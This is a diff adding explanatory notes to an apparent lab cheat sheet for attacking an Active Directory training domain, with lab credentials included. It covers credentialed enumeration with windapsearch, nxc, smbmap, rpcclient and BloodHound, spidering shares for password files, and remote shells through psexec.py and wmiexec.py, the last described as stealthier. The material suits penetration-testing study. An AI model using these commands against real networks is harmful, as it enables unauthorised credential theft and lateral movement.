@@ -26,6 +26,7 @@ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmc
 # STEP 7 — BloodHound collection
 sudo bloodhound-python -u forend -p Klmcargo2 -ns 172.16.5.5 -d inlanefreight.local -c all
 ```
+> Run these steps in order with any valid domain credentials. `--loggedon-users` against workstations and servers reveals where Domain Admins (DAs) are currently logged in — a target for lateral movement. `spider_plus` recursively crawls a share and saves a file listing. `-PU` in windapsearch finds all privileged users through nested group membership. BloodHound `-c all` collects everything and writes JSON files for the GUI.
 
 **Lab creds:** `forend` / `Klmcargo2` | **DC:** `172.16.5.5`
 
@@ -58,6 +59,7 @@ nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares         # share permissions
 nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
 # Spider output: /tmp/cme_spider_plus/<ip>.json
 ```
+> Replace the IP and credentials as needed. `--loggedon-users` is especially valuable against file servers and SQL servers where admins have active sessions. The spider module output goes to `/tmp/cme_spider_plus/<ip>.json` — search it for filenames containing `password`, `config`, or `credential`.
 
 **Pwn3d!** in output = local admin on that host.
 
@@ -71,6 +73,7 @@ Hunt in spidered shares for: `web.config`, `.bat`, `.ps1`, `password` in filenam
 smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
 smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
 ```
+> First command lists all shares and your read/write permissions. Second command recursively lists the directory structure of `Department Shares` without showing individual files. Useful for spotting interesting subdirectories before diving deeper.
 
 ---
 
@@ -79,6 +82,7 @@ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Departmen
 ```bash
 rpcclient -U "forend%Klmcargo2" 172.16.5.5
 ```
+> Opens an interactive RPC session. The format is `username%password` after `-U`. Once inside, type the commands from the table below.
 
 | Command | Output |
 |---------|--------|
@@ -101,6 +105,7 @@ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
 # wmiexec.py — semi-interactive via WMI (stealthier — no files dropped)
 wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
 ```
+> `psexec.py` creates a Windows service to run your shell — it runs as SYSTEM but writes to disk and is detected easily. `wmiexec.py` runs commands via Windows Management Instrumentation (WMI) — no files dropped, runs as the authenticated user. Use wmiexec when you need lower noise.
 
 | Tool | Noise | Runs As | Notes |
 |------|-------|---------|-------|
@@ -117,6 +122,7 @@ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmc
 python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da  # Domain Admins
 python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU   # privileged users (recursive)
 ```
+> A Python LDAP wrapper that is easier to use than raw `ldapsearch`. `-U` = users, `-C` = computers, `--da` = Domain Admin group members. `-PU` resolves nested group membership recursively — it finds DAs who are members through chains of groups rather than directly.
 
 `-PU` = recursive — finds DAs via nested group membership that simple enumeration misses.
 
@@ -133,6 +139,7 @@ sudo neo4j start
 bloodhound
 # Default creds: neo4j / HTB_@cademy_stdnt!
 ```
+> `-ns` sets the DNS nameserver to the DC so hostnames resolve correctly. `-c all` collects users, groups, computers, sessions, ACLs, trusts, and GPOs. The JSON files get zipped and uploaded to the BloodHound GUI. Start Neo4j first, then BloodHound, then upload the zip.
 
 **Key queries to run:**
 - Find Shortest Paths To Domain Admins
